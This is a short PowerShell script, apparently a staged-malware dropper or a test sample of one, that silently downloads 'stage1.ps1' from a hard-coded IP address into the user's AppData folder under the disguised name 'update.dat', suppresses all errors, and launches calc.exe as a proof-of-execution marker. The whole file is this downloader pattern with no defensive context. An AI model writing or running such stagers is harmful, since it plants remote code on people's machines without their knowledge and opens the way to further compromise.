
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://198.51.100.109:80/stage1.ps1',
    [string]$OutputPath = "$env:APPDATA\update.dat",
    [int]$RequestTimeout = 240
)
try { Invoke-WebRequest -Uri $PayloadUrl -OutFile $OutputPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Write-Verbose "stage marker 9 reached" } catch { Write-Warning "Remote fetch failed" }
